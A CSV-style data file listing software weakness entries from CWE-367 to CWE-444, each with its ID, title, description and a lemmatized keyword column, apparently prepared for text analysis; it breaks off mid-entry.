CWE-367,Time-of-check Time-of-use (TOCTOU) Race Condition,"The product checks the state of a resource before using that resource, but the resource's state can change between the check and the use in a way that invalidates the results of the check. This can cause the product to perform invalid actions when the resource is in an unexpected state.This weakness can be security-relevant when an attacker can influence the state of the resource between check and use. This can happen with shared resources such as files, memory, or even variables in multithreaded programs.",product check state resource resource resource state change check use way invalidate result check cause product perform invalid action resource unexpected state weakness security relevant attacker influence state resource check use happen share resource file memory variable multithreaded program
CWE-368,Context Switching Race Condition,"A product performs a series of non-atomic actions to switch between contexts that cross privilege or other security boundaries, but a race condition allows an attacker to modify or misrepresent the product's behavior during the switch.This is commonly seen in web browser vulnerabilities in which the attacker can perform certain actions while the browser is transitioning from a trusted to an untrusted domain, or vice versa, and the browser performs the actions on one domain using the trust level and resources of the other domain.",product perform series non atomic action switch context cross privilege security boundary race condition allow attacker modify misrepresent product behavior switch commonly see web browser vulnerability attacker perform certain action browser transition trusted untrusted domain vice versa browser perform action domain trust level resource domain
CWE-369,Divide By Zero,"The product divides a value by zero.This weakness typically occurs when an unexpected value is provided to the product, or if an error occurs that is not properly detected. It frequently occurs in calculations involving physical dimensions such as size, length, width, and height.",product divide value zero weakness typically occur unexpected value provide product error occur properly detect frequently occur calculation involve physical dimension size length width height
CWE-37,Path Traversal: '/absolute/pathname/here',"The product accepts input in the form of a slash absolute path ('/absolute/pathname/here') without appropriate validation, which can allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept input form slash absolute path pathname appropriate validation allow attacker traverse file system unintended location access arbitrary file
CWE-370,Missing Check for Certificate Revocation after Initial Check,"The product does not check the revocation status of a certificate after its initial revocation check, which can cause the product to perform privileged actions even after the certificate is revoked at a later time.If the revocation status of a certificate is not checked before each action that requires privileges, the system may be subject to a race condition. If a certificate is revoked after the initial check, all subsequent actions taken with the owner of the revoked certificate will lose all benefits guaranteed by the certificate. In fact, it is almost certain that the use of a revoked certificate indicates malicious activity.",product check revocation status certificate initial revocation check cause product perform privileged action certificate revoke later time revocation status certificate check action require privilege system subject race condition certificate revoke initial check subsequent action take owner revoke certificate lose benefit guarantee certificate fact certain use revoke certificate indicate malicious activity
CWE-372,Incomplete Internal State Distinction,"The product does not properly determine which state it is in, causing it to assume it is in state X when in fact it is in state Y, causing it to perform incorrect operations in a security-relevant manner.",product properly determine state cause assume state x fact state y cause perform incorrect operation security relevant manner
CWE-373,DEPRECATED: State Synchronization Error,This entry was deprecated because it overlapped the same concepts as race condition (CWE-362) and Improper Synchronization (CWE-662).,entry deprecate overlap concept race condition improper synchronization
CWE-374,Passing Mutable Objects to an Untrusted Method,"The product sends non-cloned mutable data as an argument to a method or function.The function or method that has been called can alter or delete the mutable data. This could violate assumptions that the calling function has made about its state. In situations where unknown code is called with references to mutable data, this external code could make changes to the data sent. If this data was not previously cloned, the modified data might not be valid in the context of execution.",product send non cloned mutable datum argument method function function method call alter delete mutable datum violate assumption call function state situation unknown code call reference mutable datum external code change datum send data previously clone modify datum valid context execution
CWE-375,Returning a Mutable Object to an Untrusted Caller,"Sending non-cloned mutable data as a return value may result in that data being altered or deleted by the calling function.In situations where functions return references to mutable data, it is possible that the external code which called the function may make changes to the data sent. If this data was not previously cloned, the class will then be using modified data which may violate assumptions about its internal state.",send non cloned mutable datum return value result datum alter delete call function situation function return reference mutable datum possible external code call function change datum send data previously clone class modify datum violate assumption internal state
CWE-377,Insecure Temporary File,Creating and using insecure temporary files can leave application and system data vulnerable to attack.,create insecure temporary file leave application system datum vulnerable attack
CWE-378,Creation of Temporary File With Insecure Permissions,"Opening temporary files without appropriate measures or controls can leave the file, its contents and any function that it impacts vulnerable to attack.",open temporary file appropriate measure control leave file content function impact vulnerable attack
CWE-379,Creation of Temporary File in Directory with Insecure Permissions,"The product creates a temporary file in a directory whose permissions allow unintended actors to determine the file's existence or otherwise access that file.On some operating systems, the fact that the temporary file exists may be apparent to any user with sufficient privileges to access that directory. Since the file is visible, the application that is using the temporary file could be known. If one has access to list the processes on the system, the attacker has gained information about what the user is doing at that time. By correlating this with the applications the user is running, an attacker could potentially discover what a user's actions are. From this, higher levels of security could be breached.",product create temporary file directory permission allow unintended actor determine file existence access file operate system fact temporary file exist apparent user sufficient privilege access directory file visible application temporary file know access list process system attacker gain information user time correlate application user run attacker potentially discover user action high level security breach
CWE-38,Path Traversal: '\absolute\pathname\here',"The product accepts input in the form of a backslash absolute path ('\absolute\pathname\here') without appropriate validation, which can allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept input form backslash absolute path appropriate validation allow attacker traverse file system unintended location access arbitrary file
CWE-382,J2EE Bad Practices: Use of System.exit(),"A J2EE application uses System.exit(), which also shuts down its container.It is never a good idea for a web application to attempt to shut down the application container. Access to a function that can shut down the application is an avenue for Denial of Service (DoS) attacks.",application use shut container good idea web application attempt shut application container access function shut application avenue denial service dos attack
CWE-383,J2EE Bad Practices: Direct Use of Threads,"Thread management in a Web application is forbidden in some circumstances and is always highly error prone.Thread management in a web application is forbidden by the J2EE standard in some circumstances and is always highly error prone. Managing threads is difficult and is likely to interfere in unpredictable ways with the behavior of the application container. Even without interfering with the container, thread management usually leads to bugs that are hard to detect and diagnose like deadlock, race conditions, and other synchronization errors.",thread management web application forbid circumstance highly error prone thread management web application forbid standard circumstance highly error prone manage thread difficult likely interfere unpredictable way behavior application container interfere container thread management usually lead bug hard detect diagnose like deadlock race condition synchronization error
CWE-384,Session Fixation,"Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.Such a scenario is commonly observed when:A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session.The application or container uses predictable session identifiers. In the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to associate, and possibly authenticate, against the server using that session identifier, giving the attacker access to the user's account through the active session.",authenticate user establish new user session invalidate exist session identifier give attacker opportunity steal authenticate session scenario commonly observe web application authenticate user invalidate exist session continue use session associate user attacker able force know session identifier user user authenticate attacker access authenticate session application container use predictable session identifier generic exploit session fixation vulnerability attacker create new session web application record associate session identifier attacker cause victim associate possibly authenticate server session identifier give attacker access user account active session
CWE-385,Covert Timing Channel,"Covert timing channels convey information by modulating some aspect of system behavior over time, so that the program receiving the information can observe system behavior and infer protected information.In some instances, knowing when data is transmitted between parties can provide a malicious user with privileged information. Also, externally monitoring the timing of operations can potentially reveal sensitive data. For example, a cryptographic operation can expose its internal state if the time it takes to perform the operation varies, based on the state.Covert channels are frequently classified as either storage or timing channels. Some examples of covert timing channels are the system's paging rate, the time a certain transaction requires to execute, and the time it takes to gain access to a shared bus.",covert timing channel convey information modulate aspect system behavior time program receive information observe system behavior infer protect information instance know data transmit party provide malicious user privileged information externally monitor timing operation potentially reveal sensitive datum example cryptographic operation expose internal state time take perform operation vary base state covert channel frequently classify storage timing channel example covert timing channel system paging rate time certain transaction require execute time take gain access shared bus
CWE-386,Symbolic Name not Mapping to Correct Object,"A constant symbolic reference to an object is used, even though the reference can resolve to a different object over time.",constant symbolic reference object reference resolve different object time
CWE-39,Path Traversal: 'C:dirname',The product accepts input that contains a drive letter or Windows volume letter ('C:dirname') that potentially redirects access to an unintended location or arbitrary file.,product accept input contain drive letter windows volume letter c dirname potentially redirect access unintended location arbitrary file
CWE-390,Detection of Error Condition Without Action,"The product detects a specific error, but takes no actions to handle the error.",product detect specific error take action handle error
CWE-391,Unchecked Error Condition,"[PLANNED FOR DEPRECATION. SEE MAINTENANCE NOTES AND CONSIDER CWE-252, CWE-248, OR CWE-1069.] Ignoring exceptions and other error conditions may allow an attacker to induce unexpected behavior unnoticed.",plan deprecation maintenance note consider ignore exception error condition allow attacker induce unexpected behavior unnoticed
CWE-392,Missing Report of Error Condition,The product encounters an error but does not provide a status code or return value to indicate that an error has occurred.,product encounter error provide status code return value indicate error occur
CWE-393,Return of Wrong Status Code,"A function or operation returns an incorrect return value or status code that does not indicate an error, but causes the product to modify its behavior based on the incorrect result.This can lead to unpredictable behavior. If the function is used to make security-critical decisions or provide security-critical information, then the wrong status code can cause the product to assume that an action is safe, even when it is not.",function operation return incorrect return value status code indicate error cause product modify behavior base incorrect result lead unpredictable behavior function security critical decision provide security critical information wrong status code cause product assume action safe
CWE-394,Unexpected Status Code or Return Value,"The product does not properly check when a function or operation returns a value that is legitimate for the function, but is not expected by the product.",product properly check function operation return value legitimate function expect product
CWE-395,Use of NullPointerException Catch to Detect NULL Pointer Dereference,"Catching NullPointerException should not be used as an alternative to programmatic checks to prevent dereferencing a null pointer.Programmers typically catch NullPointerException under three circumstances:The program contains a null pointer dereference. Catching the resulting exception was easier than fixing the underlying problem.The program explicitly throws a NullPointerException to signal an error condition.The code is part of a test harness that supplies unexpected input to the classes under test.Of these three circumstances, only the last is acceptable.",catch nullpointerexception alternative programmatic check prevent dereference null pointer programmer typically catch nullpointerexception circumstance program contain null pointer dereference catch result exception easy fix underlie problem program explicitly throw nullpointerexception signal error condition code test harness supply unexpected input class test circumstance acceptable
CWE-396,Declaration of Catch for Generic Exception,"Catching overly broad exceptions promotes complex error handling code that is more likely to contain security vulnerabilities.Multiple catch blocks can get ugly and repetitive, but ""condensing"" catch blocks by catching a high-level class like Exception can obscure exceptions that deserve special treatment or that should not be caught at this point in the program. Catching an overly broad exception essentially defeats the purpose of a language's typed exceptions, and can become particularly dangerous if the program grows and begins to throw new types of exceptions. The new exception types will not receive any attention.",catch overly broad exception promote complex error handling code likely contain security vulnerability multiple catch block ugly repetitive condense catch block catch high level class like exception obscure exception deserve special treatment catch point program catch overly broad exception essentially defeat purpose language type exception particularly dangerous program grow begin throw new type exception new exception type receive attention
CWE-397,Declaration of Throws for Generic Exception,"Throwing overly broad exceptions promotes complex error handling code that is more likely to contain security vulnerabilities.Declaring a method to throw Exception or Throwable makes it difficult for callers to perform proper error handling and error recovery. Java's exception mechanism, for example, is set up to make it easy for callers to anticipate what can go wrong and write code to handle each specific exceptional circumstance. Declaring that a method throws a generic form of exception defeats this system.",throw overly broad exception promote complex error handling code likely contain security vulnerability declare method throw exception throwable make difficult caller perform proper error handling error recovery java exception mechanism example set easy caller anticipate wrong write code handle specific exceptional circumstance declare method throw generic form exception defeat system
CWE-40,Path Traversal: '\\UNC\share\name\' (Windows UNC Share),The product accepts input that identifies a Windows UNC share ('\\UNC\share\name') that potentially redirects access to an unintended location or arbitrary file.,product accept input identify windows unc share potentially redirect access unintended location arbitrary file
CWE-400,Uncontrolled Resource Consumption,"The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources.Limited resources include memory, file system storage, database connection pool entries, and CPU. If an attacker can trigger the allocation of these limited resources, but the number or size of the resources is not controlled, then the attacker could cause a denial of service that consumes all available resources. This would prevent valid users from accessing the product, and it could potentially have an impact on the surrounding environment. For example, a memory exhaustion attack against an application could slow down the application as well as its host operating system.There are at least three distinct scenarios which can commonly lead to resource exhaustion:Lack of throttling for the number of allocated resourcesLosing all references to a resource before reaching the shutdown stageNot closing/returning a resource after processingResource exhaustion problems are often result due to an incorrect implementation of the following situations:Error conditions and other exceptional circumstances.Confusion over which part of the program is responsible for releasing the resource.",product properly control allocation maintenance limited resource enable actor influence resource consume eventually lead exhaustion available resource limited resource include memory file system storage database connection pool entry cpu attacker trigger allocation limited resource number size resource control attacker cause denial service consume available resource prevent valid user access product potentially impact surround environment example memory exhaustion attack application slow application host operate system distinct scenario commonly lead resource exhaustion lack throttle number allocate resourceslose reference resource reach shutdown stagenot close return resource processingresource exhaustion problem result incorrect implementation following situation error condition exceptional circumstance confusion program responsible release resource
CWE-401,Missing Release of Memory after Effective Lifetime,"The product does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory.This is often triggered by improper handling of malformed data or unexpectedly interrupted sessions. In some languages, developers are responsible for tracking memory allocation and releasing the memory. If there are no more pointers or references to the memory, then it can no longer be tracked and identified for release.",product sufficiently track release allocate memory slowly consume remain memory trigger improper handling malformed datum unexpectedly interrupt session language developer responsible track memory allocation release memory pointer reference memory long track identify release
CWE-402,Transmission of Private Resources into a New Sphere ('Resource Leak'),The product makes resources available to untrusted parties when those resources are only intended to be accessed by the product.,product make resource available untrusted party resource intend access product
CWE-403,Exposure of File Descriptor to Unintended Control Sphere ('File Descriptor Leak'),"A process does not close sensitive file descriptors before invoking a child process, which allows the child to perform unauthorized I/O operations using those descriptors.When a new process is forked or executed, the child process inherits any open file descriptors. When the child process has fewer privileges than the parent process, this might introduce a vulnerability if the child process can access the file descriptor but does not have the privileges to access the associated file.",process close sensitive file descriptor invoke child process allow child perform unauthorized o operation descriptor new process fork execute child process inherit open file descriptor child process few privilege parent process introduce vulnerability child process access file descriptor privilege access associate file
CWE-404,Improper Resource Shutdown or Release,"The product does not release or incorrectly releases a resource before it is made available for re-use.When a resource is created or allocated, the developer is responsible for properly releasing the resource as well as accounting for all potential paths of expiration or invalidation, such as a set period of time or revocation.",product release incorrectly release resource available use resource create allocate developer responsible properly release resource account potential path expiration invalidation set period time revocation
CWE-405,Asymmetric Resource Consumption (Amplification),"The product does not properly control situations in which an adversary can cause the product to consume or produce excessive resources without requiring the adversary to invest equivalent work or otherwise prove authorization, i.e., the adversary's influence is ""asymmetric.""This can lead to poor performance due to ""amplification"" of resource consumption, typically in a non-linear fashion. This situation is worsened if the product allows malicious users or attackers to consume more resources than their access level permits.",product properly control situation adversary cause product consume produce excessive resource require adversary invest equivalent work prove authorization adversary influence asymmetric lead poor performance amplification resource consumption typically non linear fashion situation worsen product allow malicious user attacker consume resource access level permit
CWE-406,Insufficient Control of Network Message Volume (Network Amplification),"The product does not sufficiently monitor or control transmitted network traffic volume, so that an actor can cause the product to transmit more traffic than should be allowed for that actor.In the absence of a policy to restrict asymmetric resource consumption, the application or system cannot distinguish between legitimate transmissions and traffic intended to serve as an amplifying attack on target systems. Systems can often be configured to restrict the amount of traffic sent out on behalf of a client, based on the client's origin or access level. This is usually defined in a resource allocation policy. In the absence of a mechanism to keep track of transmissions, the system or application can be easily abused to transmit asymmetrically greater traffic than the request or client should be permitted to.",product sufficiently monitor control transmit network traffic volume actor cause product transmit traffic allow actor absence policy restrict asymmetric resource consumption application system distinguish legitimate transmission traffic intend serve amplify attack target system system configure restrict traffic send behalf client base client origin access level usually define resource allocation policy absence mechanism track transmission system application easily abuse transmit asymmetrically great traffic request client permit
CWE-407,Inefficient Algorithmic Complexity,"An algorithm in a product has an inefficient worst-case computational complexity that may be detrimental to system performance and can be triggered by an attacker, typically using crafted manipulations that ensure that the worst case is being reached.",algorithm product inefficient bad case computational complexity detrimental system performance trigger attacker typically craft manipulation ensure bad case reach
CWE-408,Incorrect Behavior Order: Early Amplification,The product allows an entity to perform a legitimate but expensive operation before authentication or authorization has taken place.,product allow entity perform legitimate expensive operation authentication authorization take place
CWE-409,Improper Handling of Highly Compressed Data (Data Amplification),"The product does not handle or incorrectly handles a compressed input with a very high compression ratio that produces a large output.An example of data amplification is a ""decompression bomb,"" a small ZIP file that can produce a large amount of data when it is decompressed.",product handle incorrectly handle compress input high compression ratio produce large output example datum amplification decompression bomb small zip file produce large datum decompress
CWE-41,Improper Resolution of Path Equivalence,"The product is vulnerable to file system contents disclosure through path equivalence. Path equivalence involves the use of special characters in file and directory names. The associated manipulations are intended to generate multiple names for the same object.Path equivalence is usually employed in order to circumvent access controls expressed using an incomplete set of file name or file path representations. This is different from path traversal, wherein the manipulations are performed to generate a name for a different object.",product vulnerable file system content disclosure path equivalence path equivalence involve use special character file directory name associate manipulation intend generate multiple name object path equivalence usually employ order circumvent access control express incomplete set file file path representation different path traversal manipulation perform generate different object
CWE-410,Insufficient Resource Pool,"The product's resource pool is not large enough to handle peak demand, which allows an attacker to prevent others from accessing the resource by using a (relatively) large number of requests for resources.Frequently the consequence is a ""flood"" of connection or sessions.",product resource pool large handle peak demand allow attacker prevent access resource relatively large number request resource frequently consequence flood connection session
CWE-412,Unrestricted Externally Accessible Lock,"The product properly checks for the existence of a lock, but the lock can be externally controlled or influenced by an actor that is outside of the intended sphere of control.This prevents the product from acting on associated resources or performing other behaviors that are controlled by the presence of the lock. Relevant locks might include an exclusive lock or mutex, or modifying a shared resource that is treated as a lock. If the lock can be held for an indefinite period of time, then the denial of service could be permanent.",product properly check existence lock lock externally control influence actor outside intended sphere control prevent product act associate resource perform behavior control presence lock relevant lock include exclusive lock mutex modify share resource treat lock lock hold indefinite period time denial service permanent
CWE-413,Improper Resource Locking,"The product does not lock or does not correctly lock a resource when the product must have exclusive access to the resource.When a resource is not properly locked, an attacker could modify the resource while it is being operated on by the product. This might violate the product's assumption that the resource will not change, potentially leading to unexpected behaviors.",product lock correctly lock resource product exclusive access resource resource properly lock attacker modify resource operate product violate product assumption resource change potentially lead unexpected behavior
CWE-414,Missing Lock Check,A product does not check to see if a lock is present before performing sensitive operations on a resource.,product check lock present perform sensitive operation resource
CWE-415,Double Free,"The product calls free() twice on the same memory address, potentially leading to modification of unexpected memory locations.When a program calls free() twice with the same argument, the program's memory management data structures become corrupted. This corruption can cause the program to crash or, in some circumstances, cause two later calls to malloc() to return the same pointer. If malloc() returns the same value twice and the program later gives the attacker control over the data that is written into this doubly-allocated memory, the program becomes vulnerable to a buffer overflow attack.",product call free twice memory address potentially lead modification unexpected memory location program call free twice argument program memory management datum structure corrupted corruption cause program crash circumstance cause later call malloc return pointer malloc return value twice program later give attacker control datum write doubly allocate memory program vulnerable buffer overflow attack
CWE-416,Use After Free,"Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.The use of previously-freed memory can have any number of adverse consequences, ranging from the corruption of valid data to the execution of arbitrary code, depending on the instantiation and timing of the flaw. The simplest way data corruption may occur involves the system's reuse of the freed memory. Use-after-free errors have two common and sometimes overlapping causes:Error conditions and other exceptional circumstances.Confusion over which part of the program is responsible for freeing the memory.In this scenario, the memory in question is allocated to another pointer validly at some point after it has been freed. The original pointer to the freed memory is used again and points to somewhere within the new allocation. As the data is changed, it corrupts the validly used memory; this induces undefined behavior in the process.If the newly allocated data happens to hold a class, in C++ for example, various function pointers may be scattered within the heap data. If one of these function pointers is overwritten with an address to valid shellcode, execution of arbitrary code can be achieved.",reference memory free cause program crash use unexpected value execute code use previously free memory number adverse consequence range corruption valid datum execution arbitrary code depend instantiation timing flaw simple way datum corruption occur involve system reuse free memory use free error common overlapping cause error condition exceptional circumstance confusion program responsible free memory scenario memory question allocate pointer validly point free original pointer free memory point new allocation data change corrupt validly memory induce undefined behavior process newly allocate data happen hold class example function pointer scatter heap datum function pointer overwrite address valid shellcode execution arbitrary code achieve
CWE-419,Unprotected Primary Channel,"The product uses a primary channel for administration or restricted functionality, but it does not properly protect the channel.",product use primary channel administration restricted functionality properly protect channel
CWE-42,Path Equivalence: 'filename.' (Trailing Dot),"The product accepts path input in the form of trailing dot ('filedir.') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form trail dot filedir appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-420,Unprotected Alternate Channel,"The product protects a primary channel, but it does not use the same level of protection for an alternate channel.",product protect primary channel use level protection alternate channel
CWE-421,Race Condition During Access to Alternate Channel,"The product opens an alternate channel to communicate with an authorized user, but the channel is accessible to other actors.This creates a race condition that allows an attacker to access the channel before the authorized user does.",product open alternate channel communicate authorized user channel accessible actor create race condition allow attacker access channel authorized user
CWE-422,Unprotected Windows Messaging Channel ('Shatter'),"The product does not properly verify the source of a message in the Windows Messaging System while running at elevated privileges, creating an alternate channel through which an attacker can directly send a message to the product.",product properly verify source message windows messaging system run elevated privilege create alternate channel attacker directly send message product
CWE-423,DEPRECATED: Proxied Trusted Channel,This entry has been deprecated because it was a duplicate of CWE-441. All content has been transferred to CWE-441.,entry deprecate duplicate content transfer
CWE-424,Improper Protection of Alternate Path,The product does not sufficiently protect all possible paths that a user can take to access restricted functionality or resources.,product sufficiently protect possible path user access restricted functionality resource
CWE-425,Direct Request ('Forced Browsing'),"The web application does not adequately enforce appropriate authorization on all restricted URLs, scripts, or files.Web applications susceptible to direct request attacks often make the false assumption that such resources can only be reached through a given navigation path and so only apply authorization at certain points in the path.",web application adequately enforce appropriate authorization restricted url script file web application susceptible direct request attack false assumption resource reach give navigation path apply authorization certain point path
CWE-426,Untrusted Search Path,"The product searches for critical resources using an externally-supplied search path that can point to resources that are not under the product's direct control.This might allow attackers to execute their own programs, access unauthorized data files, or modify configuration in unexpected ways. If the product uses a search path to locate critical resources such as programs, then an attacker could modify that search path to point to a malicious program, which the targeted product would then execute. The problem extends to any type of critical resource that the product trusts.Some of the most common variants of untrusted search path are:In various UNIX and Linux-based systems, the PATH environment variable may be consulted to locate executable programs, and LD_PRELOAD may be used to locate a separate library.In various Microsoft-based systems, the PATH environment variable is consulted to locate a DLL, if the DLL is not found in other paths that appear earlier in the search order.",product search critical resource externally supply search path point resource product direct control allow attacker execute program access unauthorized datum file modify configuration unexpected way product use search path locate critical resource program attacker modify search path point malicious program target product execute problem extend type critical resource product trust common variant untrusted search path unix linux base system path environment variable consult locate executable program locate separate library microsoft base system path environment variable consult locate dll dll find path appear early search order
CWE-427,Uncontrolled Search Path Element,"The product uses a fixed or controlled search path to find resources, but one or more locations in that path can be under the control of unintended actors.Although this weakness can occur with any type of resource, it is frequently introduced when a product uses a directory search path to find executables or code libraries, but the path contains a directory that can be modified by an attacker, such as ""/tmp"" or the current working directory.In Windows-based systems, when the LoadLibrary or LoadLibraryEx function is called with a DLL name that does not contain a fully qualified path, the function follows a search order that includes two path elements that might be uncontrolled:the directory from which the program has been loadedthe current working directoryIn some cases, the attack can be conducted remotely, such as when SMB or WebDAV network shares are used.One or more locations in that path could include the Windows drive root or its subdirectories. This often exists in Linux-based code assuming the controlled nature of the root directory (/) or its subdirectories (/etc, etc), or a code that recursively accesses the parent directory. In Windows, the drive root and some of its subdirectories have weak permissions by default, which makes them uncontrolled.In some Unix-based systems, a PATH might be created that contains an empty element, e.g. by splicing an empty variable into the PATH. This empty element can be interpreted as equivalent to the current working directory, which might be an untrusted search element.In software package management frameworks (e.g., npm, RubyGems, or PyPi), the framework may identify dependencies on third-party libraries or other packages, then consult a repository that contains the desired package. The framework may search a public repository before a private repository. This could be exploited by attackers by placing a malicious package in the public repository that has the same name as a package from the private repository. The search path might not be directly under control of the developer relying on the framework, but this search order effectively contains an untrusted element.",product use fixed controlled search path find resource location path control unintended actor weakness occur type resource frequently introduce product use directory search path find executable code library path contain directory modify attacker current work directory windows base system loadlibrary loadlibraryex function call dll contain fully qualified path function follow search order include path element uncontrolled directory program loadedthe current working directoryin case attack conduct remotely smb webdav network share location path include windows drive root subdirectory exist linux base code assume controlled nature root directory subdirectory etc code recursively access parent directory windows drive root subdirectory weak permission default make uncontrolled unix base system path create contain element splice variable path element interpret equivalent current work directory untrusted search element software package management framework npm rubygems pypi framework identify dependency party library package consult repository contain desire package framework search public repository private repository exploit attacker place malicious package public repository package private repository search path directly control developer rely framework search order effectively contain untrusted element
CWE-428,Unquoted Search Path or Element,"The product uses a search path that contains an unquoted element, in which the element contains whitespace or other separators. This can cause the product to access resources in a parent path.If a malicious individual has access to the file system, it is possible to elevate privileges by inserting such a file as ""C:\Program.exe"" to be run by a privileged program making use of WinExec.",product use search path contain unquoted element element contain whitespace separator cause product access resource parent path malicious individual access file system possible elevate privilege insert file run privileged program make use winexec
CWE-43,Path Equivalence: 'filename....' (Multiple Trailing Dot),"The product accepts path input in the form of multiple trailing dot ('filedir....') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form multiple trail dot filedir appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-430,Deployment of Wrong Handler,"The wrong ""handler"" is assigned to process an object.An example of deploying the wrong handler would be calling a servlet to reveal source code of a .JSP file, or automatically ""determining"" type of the object even if it is contradictory to an explicitly specified type.",wrong handler assign process object example deploy wrong handler call servlet reveal source code file automatically determine type object contradictory explicitly specify type
CWE-431,Missing Handler,"A handler is not available or implemented.When an exception is thrown and not caught, the process has given up an opportunity to decide if a given failure or event is worth a change in execution.",handler available implement exception throw catch process give opportunity decide give failure event worth change execution
CWE-432,Dangerous Signal Handler not Disabled During Sensitive Operations,"The product uses a signal handler that shares state with other signal handlers, but it does not properly mask or prevent those signal handlers from being invoked while the original signal handler is still running.During the execution of a signal handler, it can be interrupted by another handler when a different signal is sent. If the two handlers share state - such as global variables - then an attacker can corrupt the state by sending another signal before the first handler has completed execution.",product use signal handler share state signal handler properly mask prevent signal handler invoke original signal handler run execution signal handler interrupt handler different signal send handler share state global variable attacker corrupt state send signal handler complete execution
CWE-433,Unparsed Raw Web Content Delivery,"The product stores raw content or supporting code under the web document root with an extension that is not specifically handled by the server.If code is stored in a file with an extension such as "".inc"" or "".pl"", and the web server does not have a handler for that extension, then the server will likely send the contents of the file directly to the requester without the pre-processing that was expected. When that file contains sensitive information such as database credentials, this may allow the attacker to compromise the application or associated components.",product store raw content support code web document root extension specifically handle server code store file extension web server handler extension server likely send content file directly requester pre processing expect file contain sensitive information database credential allow attacker compromise application associated component
CWE-434,Unrestricted Upload of File with Dangerous Type,The product allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product's environment.,product allow attacker upload transfer file dangerous type automatically process product environment
CWE-435,Improper Interaction Between Multiple Correctly-Behaving Entities,"An interaction error occurs when two entities have correct behavior when running independently of each other, but when they are integrated as components in a larger system or process, they introduce incorrect behaviors that may cause resultant weaknesses.When a system or process combines multiple independent components, this often produces new, emergent behaviors at the system level. However, if the interactions between these components are not fully accounted for, some of the emergent behaviors can be incorrect or even insecure.",interaction error occur entity correct behavior run independently integrate component large system process introduce incorrect behavior cause resultant weakness system process combine multiple independent component produce new emergent behavior system level interaction component fully account emergent behavior incorrect insecure
CWE-436,Interpretation Conflict,"Product A handles inputs or steps differently than Product B, which causes A to perform incorrect actions based on its perception of B's state.This is generally found in proxies, firewalls, anti-virus software, and other intermediary devices that monitor, allow, deny, or modify traffic based on how the client or server is expected to behave.",product handle input step differently product b cause perform incorrect action base perception b state generally find proxy firewall anti virus software intermediary device monitor allow deny modify traffic base client server expect behave
CWE-437,Incomplete Model of Endpoint Features,"A product acts as an intermediary or monitor between two or more endpoints, but it does not have a complete model of an endpoint's features, behaviors, or state, potentially causing the product to perform incorrect actions based on this incomplete model.",product act intermediary monitor endpoint complete model endpoint feature behavior state potentially cause product perform incorrect action base incomplete model
CWE-439,Behavioral Change in New Version or Environment,"A's behavior or functionality changes with a new version of A, or a new environment, which is not known (or manageable) by B.",behavior functionality change new version new environment know manageable
CWE-44,Path Equivalence: 'file.name' (Internal Dot),"The product accepts path input in the form of internal dot ('file.ordir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form internal dot appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-440,Expected Behavior Violation,"A feature, API, or function does not perform according to its specification.",feature api function perform accord specification
CWE-441,Unintended Proxy or Intermediary ('Confused Deputy'),"The product receives a request, message, or directive from an upstream component, but the product does not sufficiently preserve the original source of the request before forwarding the request to an external actor that is outside of the product's control sphere. This causes the product to appear to be the source of the request, leading it to act as a proxy or other intermediary between the upstream component and the external actor.If an attacker cannot directly contact a target, but the product has access to the target, then the attacker can send a request to the product and have it be forwarded to the target. The request would appear to be coming from the product's system, not the attacker's system. As a result, the attacker can bypass access controls (such as firewalls) or hide the source of malicious requests, since the requests would not be coming directly from the attacker.Since proxy functionality and message-forwarding often serve a legitimate purpose, this issue only becomes a vulnerability when:The product runs with different privileges or on a different system, or otherwise has different levels of access than the upstream component;The attacker is prevented from making the request directly to the target; andThe attacker can create a request that the proxy does not explicitly intend to be forwarded on the behalf of the requester. Such a request might point to an unexpected hostname, port number, hardware IP, or service. Or, the request might be sent to an allowed service, but the request could contain disallowed directives, commands, or resources.",product receive request message directive upstream component product sufficiently preserve original source request forward request external actor outside product control sphere cause product appear source request lead act proxy intermediary upstream component external actor attacker directly contact target product access target attacker send request product forward target request appear come product system attacker system result attacker bypass access control firewall hide source malicious request request come directly attacker proxy functionality message forwarding serve legitimate purpose issue vulnerability product run different privilege different system different level access upstream attacker prevent make request directly target andthe attacker create request proxy explicitly intend forward behalf requester request point unexpected hostname port number hardware ip service request send allowed service request contain disallowed directive command resource
CWE-443,DEPRECATED: HTTP response splitting,This weakness can be found at CWE-113.,weakness find
CWE-444,Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling'),"The product acts as an intermediary HTTP agent (such as a proxy or firewall) in the data flow between two entities such as a client and server, but it does not interpret malformed HTTP requests or responses in ways that are consistent with how the messages will be processed by those entities that are at the ultimate destination.HTTP requests or responses (""messages"") can be malformed or unexpected in ways that cause web servers or clients to interpret the messages in different ways than intermediary HTTP agents such as load balancers, reverse proxies, web caching proxies, application firewalls, etc. For example, an adversary may be able to add duplicate or different header fields that a client or server might interpret as one set of messages, whereas the intermediary might interpret the same sequence of bytes as a different set of messages. For example, discrepancies can arise in how to handle duplicate headers like two Transfer-encoding (TE) or two Content-length (CL), or the malicious HTTP message will have different headers for TE and CL.The inconsistent parsing and interpretation of messages can allow the adversary to ""smuggle"" a message to the client/server without the intermediary being aware of it.This weakness is usually the result of the usage of outdated or incompatible HTTP protocol versions in the HTTP agents.",product act intermediary http agent proxy firewall data flow entity client server interpret malformed http request response way consistent message process entity ultimate destination http request response message malformed unexpected way cause web server client interpret message different way intermediary http agent load balancer reverse proxy web caching proxy application firewall etc example adversary able add duplicate different header field client server 